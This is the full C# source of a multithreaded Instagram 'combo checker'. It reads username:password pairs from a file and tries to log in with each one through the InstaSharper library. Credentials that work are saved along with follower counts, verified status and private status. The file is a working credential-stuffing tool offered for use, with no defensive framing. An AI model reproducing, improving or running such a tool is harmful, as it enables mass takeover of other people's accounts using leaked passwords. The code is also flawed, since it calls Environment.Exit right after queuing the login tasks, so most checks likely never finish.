using System;
using System.Collections.Generic;
using InstaSharper.API.Builder;
using InstaSharper.Classes;
using InstaSharper.Classes.Models;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace InstaBatch
{
    class Program
    {
        static bool oFollower = false, oPrivate = false, oVerify = false;
        static string mInput, mOutput;
        static List<UserStruct> mUsers = new List<UserStruct>();
        private static string mPattern = @"([a-zA-Z0-9_\-\.]{3,40}):([a-zA-Z0-9_\-\.]{5,40})";
        private static int mThreads = 10;
        static void Main(string[] args)
        {
            if (args.Length > 2)
            {
                for (var i = 0; i < args.Length - 2; i++)
                {
                    if (args[i] == "-follower")
                    {
                        oFollower = true;
                    }
                    else if (args[i] == "-private")
                    {
                        oPrivate = true;
                    }
                    else if (args[i] == "-verify")
                    {
                        oVerify = true;
                    }
                    else if (args[i].StartsWith("-threads="))
                    {
                        string t = args[i].Substring(9);
                        int th = 0;
                        int.TryParse(t, out th);
                        if (th != 0)
                            mThreads = th;
                    }
                }
            }
            else if (args.Length < 2)
            {
                Console.WriteLine("Usage : InstaBatch [options] input output");
                Console.WriteLine("options : ");
                Console.WriteLine("-verify \tCheck User Verification");
                Console.WriteLine("-private \tCheck Profile State");
                Console.WriteLine("-follower \tCheck Profile Followers");
                Console.WriteLine("-threads=10 \tSet Threads");
                Console.WriteLine("input \tCombo File (Format : [username:password])");
                Console.WriteLine("output \tResult File");
                Console.WriteLine("*** WARNING ***");
                Console.WriteLine("Dont specify file path with whitespace or escape it with \"\"");
                Console.ReadKey();
                Environment.Exit(1);
            }
            mInput = args[args.Length - 2];
            mOutput = args[args.Length - 1];
            if (!File.Exists(mInput))
            {
                Console.WriteLine("[Fatal Error] - Source File Not Found");
                Environment.Exit(-1);
            }
            if (File.Exists(mOutput))
            {
                Console.WriteLine("[WARNING] - Destination File Exists");
            }
            string[] rows = File.ReadAllLines(mInput);
            foreach (var r in rows)
            {
                if (Regex.IsMatch(r, mPattern))
                {
                    Match m = Regex.Match(r, mPattern);
                    mUsers.Add(new UserStruct(m.Groups[1].Value, m.Groups[2].Value));
                }
            }
            if (mUsers.Count == 0)
            {
                Console.WriteLine("[Fatal Error] - Source File is Empty");
                Environment.Exit(-1);
            }
            CheckAccount chk = new CheckAccount(mUsers, mOutput,mThreads, oPrivate, oFollower, oVerify);
            chk.Start();

            while (true)
            {
                if (Console.ReadLine() == "exit")
                {
                    break;
                }
            }
        }
    }
    class CheckAccount
    {
        private List<UserStruct> mUsers;
        bool oFollower, oVerify, oPrivate;
        string mOutput;
        static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
        int mThreads; 
        public CheckAccount(List<UserStruct> users, string Output,int threads, bool pv, bool fl, bool vf)
        {
            mUsers = users;
            oFollower = fl;
            oPrivate = pv;
            oVerify = vf;
            mOutput = Output;
            mThreads = threads;
        }
        public void Start()
        {
            SemaphoreSlim maxThread = new SemaphoreSlim(mThreads);


            foreach (var u in mUsers)
            {
                maxThread.Wait();
                Task.Factory.StartNew(async () =>
                 {
                     var userSession = new UserSessionData
                     {
                         UserName = u.Username,
                         Password = u.Password
                     };
                     var api = new InstaApiBuilder()
                     .SetUser(userSession)
                     .Build();
                     var logInResult = await api.LoginAsync();
                     if (!logInResult.Succeeded)
                     {
                         if (logInResult.Info.ResponseType == ResponseType.CheckPointRequired)
                         {
                             Console.WriteLine($"Unable to login: CheckPoint Required");
                         }
                         else if (logInResult.Info.ResponseType == ResponseType.Unknown)
                         {
                             Console.WriteLine($"Unable to login: {logInResult.Info.Message}");
                         }
                         else if (logInResult.Info.ResponseType == ResponseType.RequestsLimit)
                         {
                             Console.WriteLine($"Unable to login: Rate Limit");
                             Environment.Exit(-10);
                         }
                     }
                     else
                     {
                         try
                         {
                             var user = await api.GetCurrentUserAsync();

                             string output = $"{u.Username}:{u.Password}";
                             if (oFollower)
                             {
                                 var followers = await api.GetUserFollowersAsync(user.Value.UserName, 100);
                                 output += $"\tFollowers={followers.Value.Count}";
                             }
                             if (oVerify)
                             {
                                 output += $"\tVerified={user.Value.IsVerified.ToString()}";
                             }
                             if (oPrivate)
                             {
                                 output += $"\tPrivate:{user.Value.IsPrivate.ToString()}";
                             }
                             output += "\r\n";
                             lock (this)
                             {
                                 locker.EnterWriteLock();
                                 File.AppendAllText(mOutput, output);
                                 locker.ExitWriteLock();
                             }
                             Console.WriteLine(output);

                         }
                         catch (Exception er)
                         {
                             locker.EnterWriteLock();
                             File.AppendAllText(mOutput, $"{u.Username}:{u.Password}\tForce Secure\r\n");
                             locker.ExitWriteLock();

                         }
                     }
                 }
                    , TaskCreationOptions.LongRunning)
                .ContinueWith((task) => maxThread.Release());

            }
            Environment.Exit(0);
        }
    }

}